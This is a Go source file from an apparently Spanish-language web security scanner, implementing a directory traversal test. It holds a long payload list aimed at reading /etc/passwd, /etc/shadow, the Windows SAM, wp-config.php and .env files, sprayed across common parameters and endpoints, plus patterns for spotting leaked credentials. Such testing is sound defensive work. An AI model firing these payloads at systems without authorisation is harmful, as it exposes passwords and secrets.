package tests

import (
	"fmt"
	"io"
	"net/url"
	"strings"
	"time"

	"github.com/versaSecurityTest/internal/config"
)

// AdvancedDirectoryTraversalTest - Test exhaustivo de Directory Traversal
type AdvancedDirectoryTraversalTest struct{}

// Run ejecuta tests completos de directory traversal
func (t *AdvancedDirectoryTraversalTest) Run(targetURL string, client HTTPClient, payloads *config.PayloadConfig) TestResult {
	result := TestResult{
		TestName:    "Advanced Directory Traversal Test",
		Status:      "Passed",
		Description: "No se detectaron vulnerabilidades de directory traversal",
		Severity:    "None",
		Details:     []string{},
		Evidence:    []Evidence{},
	}

	// PAYLOADS EXHAUSTIVOS DE DIRECTORY TRAVERSAL
	traversalPayloads := []string{
		// Basic directory traversal
		"../", "..\\", "..%2F", "..%5C",
		"../../", "..\\..\\", "..%2F..%2F", "..%5C..%5C",
		"../../../", "..\\..\\..\\", "..%2F..%2F..%2F", "..%5C..%5C..%5C",
		"../../../../", "..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C",
		"../../../../../", "..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C",
		"../../../../../../", "..\\..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C..%5C",
		"../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C..%5C..%5C",
		"../../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C",

		// With target files - Linux/Unix
		"../../../etc/passwd", "..\\..\\..\\etc\\passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5Cetc%5Cpasswd",
		"../../../../etc/passwd", "..\\..\\..\\..\\etc\\passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5Cetc%5Cpasswd",
		"../../../../../etc/passwd", "..\\..\\..\\..\\..\\etc\\passwd", "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd",
		"../../../../../../etc/passwd", "..\\..\\..\\..\\..\\..\\etc\\passwd", "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd",
		"../../../etc/shadow", "../../../../etc/shadow", "../../../../../etc/shadow",
		"../../../etc/hosts", "../../../../etc/hosts", "../../../../../etc/hosts",
		"../../../proc/version", "../../../../proc/version", "../../../../../proc/version",
		"../../../etc/issue", "../../../../etc/issue", "../../../../../etc/issue",
		"../../../etc/motd", "../../../../etc/motd", "../../../../../etc/motd",

		// With target files - Windows
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
		"..\\..\\..\\windows\\win.ini", "..%5C..%5C..%5Cwindows%5Cwin.ini",
		"..\\..\\..\\windows\\system.ini", "..%5C..%5C..%5Cwindows%5Csystem.ini",
		"..\\..\\..\\windows\\system32\\config\\sam", "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
		"..\\..\\..\\boot.ini", "..%5C..%5C..%5Cboot.ini",
		"..\\..\\..\\autoexec.bat", "..%5C..%5C..%5Cautoexec.bat",
		"..\\..\\..\\config.sys", "..%5C..%5C..%5Cconfig.sys",

		// Double encoding
		"..%252F..%252F..%252Fetc%252Fpasswd", "..%255C..%255C..%255Cwindows%255Cwin.ini",
		"..%252F..%252F..%252F..%252Fetc%252Fpasswd", "..%255C..%255C..%255C..%255Cwindows%255Cwin.ini",

		// UTF-8 encoding
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
		"..%c0%af..%c0%af..%c0%afwindows%c0%afwin.ini", "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",

		// 16-bit Unicode encoding
		"..%u002f..%u002f..%u002fetc%u002fpasswd", "..%u005c..%u005c..%u005cwindows%u005cwin.ini",

		// Dot truncation (Windows)
		"../../../etc/passwd.", "..\\..\\..\\windows\\win.ini.",
		"../../../etc/passwd...", "..\\..\\..\\windows\\win.ini...",

		// Filter bypass attempts
		"....//....//....//etc/passwd", "....\\\\....\\\\....\\\\windows\\win.ini",
		"...//...//.../etc/passwd", "...\\\\...\\\\...\\windows\\win.ini",
		"..//////etc/passwd", "..\\\\\\\\\\\\windows\\win.ini",

		// Mixed slash types
		"..\\../..\\../etc/passwd", "../..\\../..\\windows/win.ini",
		"..\\../..\\../..\\../etc/passwd", "../..\\../..\\../..\\windows/win.ini",

		// Absolute paths
		"/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/version",
		"\\windows\\system32\\drivers\\etc\\hosts", "\\windows\\win.ini", "\\boot.ini",
		"C:\\windows\\win.ini", "C:\\windows\\system.ini", "C:\\boot.ini",

		// Null byte injection (legacy)
		"../../../etc/passwd%00", "..\\..\\..\\windows\\win.ini%00",
		"../../../etc/passwd%00.txt", "..\\..\\..\\windows\\win.ini%00.txt",

		// Common web application files
		"../../../config.php", "../../../../config.php", "../../../../../config.php",
		"../../../wp-config.php", "../../../../wp-config.php", "../../../../../wp-config.php",
		"../../../database.yml", "../../../../database.yml", "../../../../../database.yml",
		"../.env", "../../.env", "../../../.env", "../../../../.env",
		"../web.config", "../../web.config", "../../../web.config",
		"../.htaccess", "../../.htaccess", "../../../.htaccess",

		// Source code files
		"../index.php", "../../index.php", "../../../index.php",
		"../admin.php", "../../admin.php", "../../../admin.php",
		"../login.php", "../../login.php", "../../../login.php",
		"../../../application.rb", "../../../../application.rb",
		"../../../app.py", "../../../../app.py", "../../../../../app.py",

		// Log files
		"../../../var/log/apache2/access.log", "../../../../var/log/apache2/access.log",
		"../../../var/log/apache2/error.log", "../../../../var/log/apache2/error.log",
		"../../../var/log/nginx/access.log", "../../../../var/log/nginx/access.log",
		"../../../var/log/nginx/error.log", "../../../../var/log/nginx/error.log",

		// Overlong UTF-8 sequences
		"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
		"%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%afetc%e0%80%afpasswd",
	}

	// PARÁMETROS COMUNES VULNERABLES
	vulnerableParams := []string{
		"file", "filename", "path", "filepath", "dir", "directory", "folder",
		"page", "include", "inc", "require", "load", "document", "doc",
		"template", "view", "layout", "theme", "skin", "style", "css",
		"image", "img", "picture", "photo", "avatar", "icon", "logo",
		"download", "upload", "attachment", "resource", "asset", "static",
		"config", "conf", "setting", "option", "param", "var", "data",
		"backup", "log", "logs", "trace", "debug", "error", "output",
		"content", "text", "html", "xml", "json", "csv", "pdf", "zip",
	}

	// ENDPOINTS COMUNES VULNERABLES
	vulnerableEndpoints := []string{
		"/download", "/file", "/image", "/img", "/pic", "/photo", "/avatar",
		"/include", "/load", "/get", "/fetch", "/read", "/view", "/show",
		"/page", "/content", "/document", "/doc", "/pdf", "/attachment",
		"/admin/file", "/admin/download", "/admin/backup", "/admin/logs",
		"/api/file", "/api/download", "/api/document", "/api/resource",
		"/upload", "/files", "/documents", "/resources", "/assets", "/static",
		"/backup", "/backups", "/logs", "/log", "/trace", "/debug",
	}

	var vulnerabilitiesFound int
	var totalTests int

	for _, endpoint := range vulnerableEndpoints {
		for _, param := range vulnerableParams {
			for _, payload := range traversalPayloads {
				totalTests++
				
				// Test en parámetros GET
				testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, endpoint, param, url.QueryEscape(payload))
				
				resp, err := client.Get(testURL)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				// Leer respuesta
				body, err := io.ReadAll(resp.Body)
				if err != nil {
					continue
				}
				responseText := string(body)

				// ANÁLISIS DE DIRECTORY TRAVERSAL
				traversalVuln := t.analyzeTraversalResponse(resp.StatusCode, responseText, payload)
				
				if traversalVuln.IsVulnerable {
					vulnerabilitiesFound++
					
					result.Evidence = append(result.Evidence, Evidence{
						Type:        "Directory Traversal",
						URL:         testURL,
						Payload:     payload,
						StatusCode:  resp.StatusCode,
						Response:    traversalVuln.Evidence,
						Description: traversalVuln.Description,
						Severity:    traversalVuln.Severity,
					})

					result.Details = append(result.Details,
						fmt.Sprintf("DIRECTORY TRAVERSAL: %s?%s=%s - %s", endpoint, param, payload, traversalVuln.Description))
				}

				// Rate limiting
				if totalTests%75 == 0 {
					time.Sleep(100 * time.Millisecond)
				}
			}
		}
	}

	// Evaluar resultados
	if vulnerabilitiesFound > 0 {
		result.Status = "Failed"
		result.Severity = "Critical"
		result.Description = fmt.Sprintf("CRÍTICO: Se detectaron %d vulnerabilidades de directory traversal en %d tests realizados", vulnerabilitiesFound, totalTests)
	} else {
		result.Details = append(result.Details, fmt.Sprintf("Se realizaron %d tests exhaustivos de directory traversal sin detectar vulnerabilidades", totalTests))
	}

	return result
}

// TraversalVulnerability estructura para análisis de directory traversal
type TraversalVulnerability struct {
	IsVulnerable bool
	Description  string
	Evidence     string
	Severity     string
}

// analyzeTraversalResponse analiza la respuesta en busca de directory traversal
func (t *AdvancedDirectoryTraversalTest) analyzeTraversalResponse(statusCode int, responseText, payload string) TraversalVulnerability {
	responseLower := strings.ToLower(responseText)
	
	// PATRONES DE ARCHIVOS SISTEMA UNIX/LINUX
	unixPatterns := []struct {
		pattern     string
		description string
		severity    string
	}{
		{"root:x:0:0:", "/etc/passwd accedido - usuarios del sistema expuestos", "Critical"},
		{"daemon:x:", "/etc/passwd accedido - cuentas del sistema visibles", "Critical"},
		{"bin:x:1:1:", "/etc/passwd accedido - estructura de usuarios comprometida", "Critical"},
		{"root:$", "/etc/shadow accedido - hashes de contraseñas expuestos", "Critical"},
		{"# localhost", "/etc/hosts accedido - configuración de red expuesta", "High"},
		{"127.0.0.1", "/etc/hosts accedido - mapeo de hosts visible", "High"},
		{"linux version", "/proc/version accedido - información del kernel expuesta", "Medium"},
		{"ubuntu", "/etc/issue accedido - información del sistema expuesta", "Medium"},
		{"debian", "/etc/issue accedido - información del sistema expuesta", "Medium"},
		{"welcome to", "/etc/motd accedido - mensaje del sistema visible", "Low"},
	}

	// PATRONES DE ARCHIVOS SISTEMA WINDOWS
	windowsPatterns := []struct {
		pattern     string
		description string
		severity    string
	}{
		{"[boot loader]", "boot.ini accedido - configuración de arranque expuesta", "Critical"},
		{"timeout=", "boot.ini accedido - parámetros de arranque visibles", "Critical"},
		{"# copyright (c) 1993-", "win.ini accedido - configuración de Windows expuesta", "High"},
		{"[fonts]", "win.ini accedido - configuración del sistema visible", "High"},
		{"[extensions]", "win.ini accedido - asociaciones de archivos expuestas", "High"},
		{"[mci extensions]", "system.ini accedido - configuración del sistema expuesta", "High"},
		{"[386enh]", "system.ini accedido - configuración avanzada visible", "High"},
		{"# localhost", "hosts (Windows) accedido - configuración DNS expuesta", "High"},
		{"files=", "config.sys accedido - configuración DOS expuesta", "Medium"},
		{"@echo off", "autoexec.bat accedido - scripts de arranque visibles", "Medium"},
	}

	// Buscar patrones Unix/Linux
	for _, pattern := range unixPatterns {
		if strings.Contains(responseLower, pattern.pattern) {
			return TraversalVulnerability{
				IsVulnerable: true,
				Description:  pattern.description,
				Evidence:     fmt.Sprintf("Patrón encontrado: '%s' en respuesta con payload '%s'", pattern.pattern, payload),
				Severity:     pattern.severity,
			}
		}
	}

	// Buscar patrones Windows
	for _, pattern := range windowsPatterns {
		if strings.Contains(responseLower, pattern.pattern) {
			return TraversalVulnerability{
				IsVulnerable: true,
				Description:  pattern.description,
				Evidence:     fmt.Sprintf("Patrón encontrado: '%s' en respuesta con payload '%s'", pattern.pattern, payload),
				Severity:     pattern.severity,
			}
		}
	}

	// PATRONES DE ARCHIVOS WEB COMUNES
	webPatterns := []struct {
		pattern     string
		description string
		severity    string
	}{
		{"<?php", "Archivo PHP source code accedido", "High"},
		{"database_password", "Archivo de configuración con credenciales accedido", "Critical"},
		{"mysql_connect", "Configuración de base de datos expuesta", "Critical"},
		{"password", "Archivo con posibles credenciales accedido", "High"},
		{"secret_key", "Claves secretas expuestas en archivo de configuración", "Critical"},
		{"api_key", "API keys expuestas en archivos", "High"},
		{"define('db_", "Configuración de WordPress accedida", "High"},
		{"$database", "Variables de base de datos expuestas", "High"},
		{"allowoverride", ".htaccess accedido - configuración Apache expuesta", "Medium"},
		{"rewriterule", ".htaccess accedido - reglas de reescritura visibles", "Medium"},
	}

	// Buscar patrones de archivos web
	for _, pattern := range webPatterns {
		if strings.Contains(responseLower, pattern.pattern) {
			return TraversalVulnerability{
				IsVulnerable: true,
				Description:  pattern.description,
				Evidence:     fmt.Sprintf("Patrón encontrado: '%s' en respuesta con payload '%s'", pattern.pattern, payload),
				Severity:     pattern.severity,
			}
		}
	}

	// ANÁLISIS POR STATUS CODE Y LONGITUD
	if statusCode == 200 && len(responseText) > 100 {
		// Si el payload contiene rutas conocidas y obtenemos contenido
		suspiciousPaths := []string{"etc/passwd", "windows/win.ini", "etc/shadow", "boot.ini", "config.php", "web.config"}
		for _, path := range suspiciousPaths {
			if strings.Contains(strings.ToLower(payload), path) {
				return TraversalVulnerability{
					IsVulnerable: true,
					Description:  fmt.Sprintf("Posible acceso a archivo del sistema: %s", path),
					Evidence:     fmt.Sprintf("Status 200 con contenido (%d chars) para payload: %s", len(responseText), payload),
					Severity:     "Medium",
				}
			}
		}
	}

	// DETECCIÓN DE ERRORES REVELADORES
	errorPatterns := []string{
		"no such file or directory", "file not found", "access denied",
		"permission denied", "cannot open file", "invalid path",
		"path not found", "directory not found", "file does not exist",
	}

	for _, errorPattern := range errorPatterns {
		if strings.Contains(responseLower, errorPattern) && strings.Contains(payload, "../") {
			return TraversalVulnerability{
				IsVulnerable: true,
				Description:  "Error del sistema revelado - posible directory traversal",
				Evidence:     fmt.Sprintf("Error del sistema: '%s' con payload: %s", errorPattern, payload),
				Severity:     "Low",
			}
		}
	}

	return TraversalVulnerability{IsVulnerable: false}
}
